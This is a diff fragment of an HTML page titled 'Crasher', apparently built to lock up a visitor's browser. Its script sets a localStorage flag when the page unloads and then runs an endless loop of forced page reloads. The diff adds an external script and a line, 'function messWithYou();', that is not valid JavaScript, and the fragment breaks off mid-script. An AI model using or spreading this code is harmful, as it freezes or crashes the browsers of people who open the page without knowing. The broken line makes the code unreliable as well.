@@ -5,12 +5,15 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width">
   <title>Crasher</title>
-  <link href="style.css" rel="stylesheet" type="text/css" />
+  <link href="/src/style.css" rel="stylesheet" type="text/css" />
 </head>
 
 <body>
-  <h1>Crashed!</h1>
+  <h1>Crashing in progress...</h1>
+  <script src="/src/script.js"></script>
   <script>
+    function messWithYou();
+    
     onbeforeunload = function(){localStorage.x=1};
     setTimeout(function(){
       while(1)location.reload(1)
